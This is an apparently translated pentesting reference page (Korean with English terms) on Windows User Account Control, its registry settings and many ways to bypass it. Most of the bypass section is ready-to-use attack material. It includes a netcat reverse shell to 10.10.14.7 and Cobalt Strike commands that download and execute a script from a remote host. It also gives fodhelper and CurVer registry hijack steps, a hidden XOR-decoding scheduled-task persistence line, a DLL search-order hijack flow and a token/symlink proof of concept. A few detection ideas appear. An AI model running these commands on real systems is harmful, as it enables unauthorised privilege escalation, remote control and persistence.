# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)는 **상승된 작업에 대한 consent prompt**를 가능하게 하는 기능이다. 애플리케이션에는 서로 다른 `integrity` 수준이 있으며, **높은 수준**의 프로그램은 시스템을 **잠재적으로 손상시킬 수 있는** 작업을 수행할 수 있다. UAC가 활성화되면, 애플리케이션과 작업은 관리자가 시스템에서 관리자 수준 접근 권한으로 실행하도록 명시적으로 승인하지 않는 한 항상 **비관리자 계정의 보안 컨텍스트**에서 실행된다. 이는 관리자를 의도치 않은 변경으로부터 보호하는 편의 기능이지만, security boundary로 간주되지는 않는다.

integrity levels에 대한 자세한 정보:

{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC가 적용되면, administrator user에게는 2개의 token이 주어진다: 일반 작업을 일반 수준으로 수행하기 위한 standard user key 하나와 admin privileges를 가진 하나.

이 [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)는 UAC의 동작을 매우 자세히 설명하며, logon process, user experience, UAC architecture를 포함한다. Administrators는 security policies를 사용해 local level에서(UAC가 조직 내에서 어떻게 동작할지 secpol.msc로 설정) 또는 Active Directory domain 환경에서 Group Policy Objects (GPO)를 통해 배포하도록 구성할 수 있다. 다양한 설정은 [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)에서 자세히 다룬다. UAC에는 설정할 수 있는 10개의 Group Policy setting이 있다. 다음 표는 추가 정보를 제공한다:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Policies for installing software on Windows

**local security policies** ("secpol.msc" on most systems)는 기본적으로 **비관리자 사용자가 software installations를 수행하지 못하도록** 구성되어 있다. 즉, 비관리자 사용자가 software의 installer를 다운로드할 수 있더라도 admin account 없이 실행할 수는 없다.

### Registry Keys to Force UAC to Ask for Elevation

admin rights가 없는 standard user로서, 특정 작업을 시도할 때 UAC가 "standard" account에 **credentials 입력을 요청하도록** 만들 수 있다. 이 작업에는 특정 **registry keys**를 수정해야 하며, 이를 위해서는 **UAC bypass**가 있거나 attacker가 이미 admin으로 로그인한 상태여야 한다.

사용자가 **Administrators** group에 속해 있더라도, 이러한 변경은 administrative actions를 수행하기 위해 **계정 credentials를 다시 입력**하도록 강제한다.

**유일한 단점은 이 방식이 작동하려면 UAC가 비활성화되어 있어야 한다는 점인데, production environments에서는 그럴 가능성이 낮다.**

변경해야 하는 registry keys와 entries는 다음과 같다(괄호 안은 default values):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

이는 Local Security Policy tool을 통해 수동으로도 할 수 있다. 변경 후에는 administrative operations에서 사용자가 credentials를 다시 입력하라는 prompt가 표시된다.

### Note

**User Account Control은 security boundary가 아니다.** 따라서 standard users는 local privilege escalation exploit 없이는 계정에서 벗어나 administrator rights를 얻을 수 없다.

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode는 무결성 검사를 사용하여 high-integrity-level 프로세스(예: 웹 브라우저)가 low-integrity-level 데이터(예: temporary Internet files folder)에 접근하지 못하게 합니다. 이는 브라우저를 low-integrity token으로 실행함으로써 이루어집니다. 브라우저가 low-integrity zone에 저장된 데이터에 접근하려고 하면, 운영 체제는 프로세스의 integrity level을 확인하고 그에 따라 접근을 허용합니다. 이 기능은 remote code execution 공격이 시스템의 민감한 데이터에 접근하는 것을 방지하는 데 도움이 됩니다.
- 사용자가 Windows에 로그온하면, 시스템은 사용자의 privileges 목록을 포함한 access token을 생성합니다. Privileges는 사용자의 rights와 capabilities의 조합으로 정의됩니다. token에는 또한 사용자의 credentials 목록이 포함되며, 이 credentials는 컴퓨터와 네트워크상의 resources에 대해 사용자를 authenticate하는 데 사용됩니다.

### Autoadminlogon

시작 시 특정 사용자가 자동으로 로그온하도록 Windows를 구성하려면 **`AutoAdminLogon` registry key**를 설정합니다. 이는 kiosk 환경이나 테스트 용도에 유용합니다. password가 registry에 노출되므로, 보안이 확보된 시스템에서만 사용하세요.

Registry Editor 또는 `reg add`를 사용하여 다음 key를 설정합니다:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

정상적인 logon 동작으로 되돌리려면 `AutoAdminLogon`을 0으로 설정합니다.

## UAC bypass

> [!TIP]
> 대상 시스템에 graphical access가 있다면, UAC bypass는 매우 간단합니다. UAC prompt가 나타날 때 "Yes"를 클릭하면 되기 때문입니다.

UAC bypass는 다음 상황에서 필요합니다: **UAC가 활성화되어 있고, process가 medium integrity context에서 실행 중이며, 사용자가 administrators group에 속해 있는 경우**입니다.

**UAC가 highest security level (Always)일 때는 다른 level(Default)보다 bypass하기가 훨씬 더 어렵다는 점**을 언급하는 것이 중요합니다.

### UAC disabled

이미 UAC가 비활성화되어 있다면 (`ConsentPromptBehaviorAdmin`이 **`0`**), 다음과 같은 방법을 사용하여 **admin privileges를 가진 reverse shell**(high integrity level)을 실행할 수 있습니다:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### 토큰 복제를 이용한 UAC bypass

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **매우** 기본적인 UAC "bypass" (전체 file system access)

Administrators group 안에 있는 user로 shell이 있다면 SMB(file system)를 통해 공유된 **C$를 mount**해서 새 disk에 로컬로 연결할 수 있고, 그러면 **file system 안의 모든 것에 access**할 수 있습니다(Administrator home folder까지도).

> [!WARNING]
> **이 트릭은 더 이상 동작하지 않는 것 같습니다**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### cobalt strike를 이용한 UAC bypass

Cobalt Strike techniques는 UAC가 최대 보안 수준으로 설정되어 있지 않을 때만 작동합니다
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** and **Metasploit** also have several modules to **bypass** the **UAC**.

### KRBUACBypass

Documentation and tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME)는 여러 UAC bypass exploits의 **compilation**입니다. **visual studio** 또는 **msbuild를 사용해 UACME를 compile해야 한다**는 점에 유의하세요. compilation은 여러 executables(예: `Source\Akagi\outout\x64\Debug\Akagi.exe`)를 생성하며, **어떤 것이 필요한지** 알아야 합니다.\
**주의해야** 하는데, 일부 bypass는 **다른 program을 prompt**하여 **user에게** 무언가가 발생하고 있음을 **alert**할 수 있습니다.

UACME에는 각 technique가 **작동하기 시작한 build version**이 있습니다. 자신의 version에 영향을 주는 technique를 검색할 수 있습니다:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.

### UAC Bypass – fodhelper.exe (Registry hijack)

신뢰할 수 있는 바이너리 `fodhelper.exe`는 최신 Windows에서 auto-elevated 된다. 실행되면 `DelegateExecute` verb를 검증하지 않고 아래의 per-user registry path를 조회한다. 여기에 command를 심어두면 Medium Integrity process(사용자가 Administrators에 속함)가 UAC prompt 없이 High Integrity process를 spawn할 수 있다.

fodhelper가 조회하는 Registry path:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell 단계(페이로드를 설정한 다음 트리거)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
참고:
- 현재 사용자가 Administrators의 멤버이고 UAC level이 default/lenient일 때만 동작한다(Always Notify with extra restrictions는 아님).
- 64-bit Windows의 32-bit process에서 64-bit PowerShell을 시작하려면 `sysnative` path를 사용한다.
- Payload는 어떤 command든 가능하다(PowerShell, cmd, 또는 EXE path). stealth를 위해 UI prompt는 피한다.

#### CurVer/extension hijack variant (HKCU only)

최근 `fodhelper.exe`를 악용하는 sample들은 `DelegateExecute`를 피하고, 대신 per-user `CurVer` value를 통해 **`ms-settings` ProgID를 redirect**한다. auto-elevated binary는 여전히 `HKCU` 아래에서 handler를 resolve하므로, key를 plant하는 데 admin token이 필요하지 않다:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
권한 상승 후, malware는 일반적으로 `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin`을 `0`으로 설정하여 **향후 프롬프트를 비활성화**한 다음, 추가적인 defense evasion(예: `Add-MpPreference -ExclusionPath C:\ProgramData`)을 수행하고 high integrity로 실행되도록 persistence를 다시 생성합니다. 일반적인 persistence 작업은 디스크에 **XOR-encrypted PowerShell script**를 저장하고, 매시간 이를 메모리에서 디코드/실행합니다:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
이 변종은 여전히 dropper를 정리하고 staged payload만 남기므로, 탐지는 **`CurVer` hijack**, `ConsentPromptBehaviorAdmin` 변조, Defender exclusion 생성, 또는 PowerShell을 메모리에서 복호화하는 scheduled tasks를 모니터링하는 데 의존하게 됩니다.

#### More UAC bypass

여기서 사용하는 **모든** technique는 AUC를 우회하기 위해 victim과의 **full interactive shell**을 **요구**합니다(일반적인 nc.exe shell만으로는 충분하지 않음).

**meterpreter** session을 사용해 얻을 수 있습니다. **Session** 값이 **1**인 **process**로 migrate 하세요:

![](<../../images/image (863).png>)

(_explorer.exe_ should works)

### GUI를 이용한 UAC Bypass

**GUI에 access**가 있다면 UAC prompt가 뜰 때 그냥 **accept**하면 되므로, 사실 bypass가 따로 필요하지 않습니다. 따라서 GUI에 access하는 것만으로도 UAC를 bypass할 수 있습니다.

또한, 누군가가 사용하던 GUI session(RDP를 통해 얻었을 수도 있음)을 얻었다면, 이미 **administrator로 실행 중인** tool이 **몇 가지** 있을 수 있고, 여기서 예를 들어 [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)처럼 UAC에 다시 묻히지 않고 곧바로 **admin**으로 **cmd**를 **run**할 수 있습니다. 이는 조금 더 **stealthy**할 수 있습니다.

### 시끄러운 brute-force UAC bypass

시끄러운 것에 신경 쓰지 않는다면, 언제든지 [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) 같은 것을 **run**해서 사용자가 허용할 때까지 **권한 상승을 요청**하게 할 수 있습니다.

### 자신의 bypass - Basic UAC bypass methodology

**UACME**를 살펴보면, **대부분의 UAC bypasses는 Dll Hijacking 취약점**을 악용한다는 것을 알 수 있습니다(주로 악성 dll을 _C:\Windows\System32_에 쓰는 방식). [Dll Hijacking 취약점을 찾는 방법을 배우려면 이것을 읽으세요](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. **autoelevate**되는 binary를 찾습니다(실행 시 high integrity level로 동작하는지 확인).
2. procmon으로 **DLL Hijacking**에 취약할 수 있는 "**NAME NOT FOUND**" 이벤트를 찾습니다.
3. 아마도 쓰기 권한이 없는 일부 **protected paths**(예: C:\Windows\System32) 안에 DLL을 **write**해야 할 것입니다. 다음을 사용해 이를 우회할 수 있습니다:
1. **wusa.exe**: Windows 7,8 및 8.1. 이 도구는 protected paths 안에 CAB 파일의 내용을 추출할 수 있게 해줍니다(이 도구가 high integrity level에서 실행되기 때문).
2. **IFileOperation**: Windows 10.
4. DLL을 protected path 안에 복사하고 취약한 autoelevated binary를 실행하는 **script**를 준비합니다.

### 또 다른 UAC bypass technique

**autoelevated binary**가 실행될 **binary**나 **command**의 **name/path**를 **registry**에서 읽으려 하는지 확인하는 방식입니다(특히 binary가 이 정보를 **HKCU** 안에서 찾는다면 더 흥미롭습니다).

### `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack를 이용한 UAC bypass

32-bit `C:\Windows\SysWOW64\iscsicpl.exe`는 **auto-elevated** binary로, 검색 순서를 통해 `iscsiexe.dll`을 로드하도록 악용될 수 있습니다. 악성 `iscsiexe.dll`을 **user-writable** 폴더에 넣고, 그다음 현재 사용자 `PATH`(예: `HKCU\Environment\Path`를 통해)를 수정해 그 폴더가 검색되게 하면, Windows는 UAC prompt를 표시하지 않고 상승된 `iscsicpl.exe` process 안에서 공격자 DLL을 로드할 수 있습니다.

실전 메모:
- 현재 사용자가 **Administrators**에 속해 있지만 UAC 때문에 **Medium Integrity**에서 실행 중일 때 유용합니다.
- 이 bypass에서 관련 있는 것은 **SysWOW64** 복사본입니다. **System32** 복사본은 별도의 binary로 취급하고 동작을 독립적으로 검증하세요.
- 이 primitive는 **auto-elevation**과 **DLL search-order hijacking**의 조합이므로, 다른 UAC bypass에서 사용한 것과 같은 ProcMon workflow를 사용해 누락된 DLL 로드를 검증하는 데 유용합니다.

최소 흐름:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Detection ideas:
- `reg add` / registry writes to `HKCU\Environment\Path` 직후 `C:\Windows\SysWOW64\iscsicpl.exe` 실행을 경고.
- `%TEMP%` 또는 `%LOCALAPPDATA%\Microsoft\WindowsApps` 같은 **user-controlled** 위치에서 `iscsiexe.dll`을 찾기.
- `iscsicpl.exe` 실행과 비정상적인 자식 프로세스 또는 일반적인 Windows 디렉터리 밖에서 로드된 DLL을 상호 연관 짓기.

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection”는 세션별 `\Sessions\0\DosDevices/<LUID>` 맵을 사용하는 shadow-admin tokens를 사용한다. 디렉터리는 `\??`가 처음 해석될 때 `SeGetTokenDeviceMap`에 의해 지연 생성된다. 공격자가 shadow-admin token을 **SecurityIdentification** 수준에서만 가장하면, 디렉터리는 공격자를 **owner**로 하여 생성되며(`CREATOR OWNER` 상속), `\GLOBAL??`보다 우선하는 drive-letter 링크를 허용한다.

**Steps:**

1. 낮은 권한의 session에서 `RAiProcessRunOnce`를 호출해 promptless shadow-admin `runonce.exe`를 생성한다.
2. 그 primary token을 **identification** token으로 복제하고 `\??`를 열 때 이를 impersonate하여 `\Sessions\0\DosDevices/<LUID>`가 공격자 소유로 생성되게 한다.
3. 거기에 공격자가 제어하는 storage를 가리키는 `C:` symlink를 만든다; 이후 해당 session의 filesystem 접근은 `C:`를 공격자 경로로 resolve하며, prompt 없이 DLL/file hijack이 가능해진다.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [Microsoft Docs – User Account Control가 작동하는 방식](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI가 AI를 사용해 PowerShell backdoors를 생성](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Check Point Research – Operation TrueChaos: 동남아 정부 대상에 대한 0-Day Exploitation](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
